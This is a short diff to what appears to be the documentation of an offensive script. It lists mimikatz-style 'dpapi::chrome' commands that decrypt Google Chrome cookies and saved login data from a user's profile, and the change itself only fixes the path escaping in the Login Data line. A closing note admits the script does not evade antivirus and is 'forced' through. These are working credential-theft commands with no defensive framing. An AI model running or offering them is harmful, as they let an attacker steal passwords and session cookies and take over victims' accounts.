@@ -29,7 +29,7 @@ Chrome Cookies
 - dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
 
 Chrome Logins
-- dpapi::chrome /in:"C:\Users\%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data" 
+- dpapi::chrome /in:"C:\Users\\%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data" 
 
 # Note
 Script does not bypass av, we force it
